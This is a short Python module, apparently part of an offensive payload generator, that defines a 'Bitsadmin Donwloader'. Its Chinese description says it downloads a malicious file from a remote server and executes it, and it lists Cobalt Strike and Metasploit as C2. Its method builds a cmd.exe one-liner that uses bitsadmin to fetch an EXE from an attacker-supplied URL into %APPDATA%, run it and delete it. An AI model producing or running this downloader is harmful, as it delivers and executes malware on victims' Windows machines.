# encoding: utf8

class Shell:
    def __init__(self):
        self.info = {
            'Name': 'Bitsadmin Donwloader',
            'Author': 'whois',
            'Update': '2018/9/15',
        }

        self.desc_reverse = """
利用bitsadmin从远程服务器上下载恶意文件，并执行
低权限可执行(network service),无法删除\n
C2        -> Cobalt & Metasploit
Language  -> EXE
Platform  -> Above win7
"""

    def reverse(self, url, ran):
        return "cmd.exe /c bitsadmin /transfer {ran} {url} %APPDATA%\\{ran}.exe&%APPDATA%\\{ran}.exe&del %APPDATA%\\{ran}.exe".format(
            ran=ran, url=url)
